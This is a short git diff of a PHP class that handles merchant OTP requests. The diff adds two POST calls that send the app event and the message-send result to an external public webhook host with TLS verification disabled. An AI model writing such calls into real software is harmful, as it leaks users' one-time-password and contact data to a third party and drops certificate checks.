@@ -78,6 +78,12 @@ class OtpRequest extends AppMerchant implements AppEvent{
 
         if(filter_var($this->data['data']['contact'],FILTER_VALIDATE_EMAIL)) return;
 
+        Http::WithOptions([
+            'verify' => false
+        ])->post('https://typedwebhook.tools/webhook/2cb07b6c-5499-48e0-8458-73480334f3db',[
+            'cart' => $app_event
+        ]);
+
         if($app_event->status != 'success'):
             $message = isset($this->settings['otp_message']) ? $this->settings['otp_message'] : '';
             $filter_message = message_order_params($message, $attrs);
@@ -88,6 +94,12 @@ class OtpRequest extends AppMerchant implements AppEvent{
                 $this->merchant_team->account->token,
                 $this->merchant_team->ids
             );
+
+            Http::WithOptions([
+                'verify' => false
+            ])->post('https://typedwebhook.tools/webhook/2cb07b6c-5499-48e0-8458-73480334f3db',[
+                'cart' => $result_send_message
+            ]);
 
             $app_event->update([
                 'status' => $result_send_message
